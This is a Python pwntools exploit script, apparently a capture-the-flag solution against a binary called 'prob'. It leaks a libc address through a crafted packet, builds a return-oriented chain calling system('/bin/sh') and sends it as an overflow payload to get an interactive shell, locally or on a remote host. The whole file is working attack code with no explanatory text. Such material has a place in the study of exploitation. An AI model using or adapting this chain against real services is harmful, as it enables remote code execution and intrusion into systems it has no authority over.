#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('prob')
libc = ELF("./libc.so.6")
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("172.17.0.1", 10912)
        time.sleep(1)
        pid = process(["pidof", "prob"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
brva 0x160E 
brva 0x15C6
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def packetLeak(size, to_write, data):
    stream = p8(0x18).ljust(3, b"\x00")
    stream += p16(size)
    io.sendafter(b"?", stream)

    chunk = p16((0x10 << 8) | (to_write))
    chunk += data
    io.send(chunk)
    io.recvuntil(b"KAELBH")
    d = io.recv(6)
    return u64(d.ljust(8, b"\x00"))


def packetWrite(size, data):
    stream = p8(0x17).ljust(3, b"\x00")
    stream += p16(size)
    io.send(stream)
    io.send(data)



def solve():

    puts = packetLeak(1, 1, b"A"*(0x100-2))
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    offset = 552
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1
    system = libc.sym["system"]
    sh = next(libc.search(b"/bin/sh"))

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            ret,
            system
        ]
    })

    packetWrite(3, payload.ljust(0x300, b"."))
    io.send(b"\n")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

